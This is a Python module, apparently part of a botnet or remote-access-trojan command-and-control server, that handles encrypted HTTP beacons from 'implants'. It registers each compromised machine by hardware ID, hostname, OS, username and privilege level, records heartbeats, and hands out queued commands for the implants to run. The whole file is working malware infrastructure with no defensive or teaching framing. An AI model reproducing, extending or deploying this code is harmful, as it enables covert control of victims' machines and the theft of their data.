"""HTTP beacon handler — processes encrypted POST bodies from HTTP-mode implants."""

import json
import logging
import time
import uuid

from .crypto import StatelessCrypto
from .handler import handle_response
from .storage import get_pending_commands, mark_command_dispatched, update_bot_heartbeat, upsert_bot

logger = logging.getLogger(__name__)


def _wrap_command(cmd: dict) -> dict:
    args = cmd.get("args", "{}")
    if isinstance(args, str):
        try:
            args = json.loads(args)
        except json.JSONDecodeError:
            args = {}
    return {"id": cmd["id"], "seq": 0, "timestamp": int(time.time()),
            "type": "command", "data": {"command_type": cmd["command_type"], "args": args}}


async def _next_command_bytes(hwid: str, sc: StatelessCrypto) -> bytes | None:
    pending = await get_pending_commands(hwid)
    if not pending:
        return None
    cmd = pending[0]
    pkt = _wrap_command(cmd)
    await mark_command_dispatched(cmd["id"])
    return sc.encrypt(json.dumps(pkt).encode())


async def handle_beacon(body: bytes, sc: StatelessCrypto, registry, event_bus) -> bytes | None:
    try:
        packet = json.loads(sc.decrypt(body))
    except Exception as e:
        logger.warning(f"Beacon decode failed: {e}")
        return None

    ptype = packet.get("type", "")
    data = packet.get("data", {})
    hwid = data.get("hwid", "")

    if ptype == "checkin":
        return await _handle_http_checkin(packet, sc, event_bus)

    if not hwid:
        logger.warning(f"Non-checkin beacon missing hwid (type={ptype})")
        return None

    if ptype == "heartbeat":
        await update_bot_heartbeat(hwid)
        return await _next_command_bytes(hwid, sc)

    if ptype == "response":
        await handle_response(packet, hwid, event_bus)
        return await _next_command_bytes(hwid, sc)

    logger.warning(f"Unknown beacon type: {ptype}")
    return None


async def _handle_http_checkin(packet: dict, sc: StatelessCrypto, event_bus) -> bytes:
    from .api.events import Event, EventType
    data = packet.get("data", {})
    hwid = data.get("hwid", "unknown")
    session_id = str(uuid.uuid4())
    await upsert_bot(data)
    if event_bus:
        await event_bus.publish(Event(EventType.BOT_CONNECTED,
            {"hwid": hwid, "hostname": data.get("hostname"), "os": data.get("os"),
             "username": data.get("username"), "privileges": data.get("privileges")}))
    ack = {"id": str(uuid.uuid4()), "seq": 0, "timestamp": int(time.time()),
           "type": "checkin_ack",
           "data": {"session_id": session_id, "heartbeat_interval": 30, "hwid": hwid}}
    return sc.encrypt(json.dumps(ack).encode())
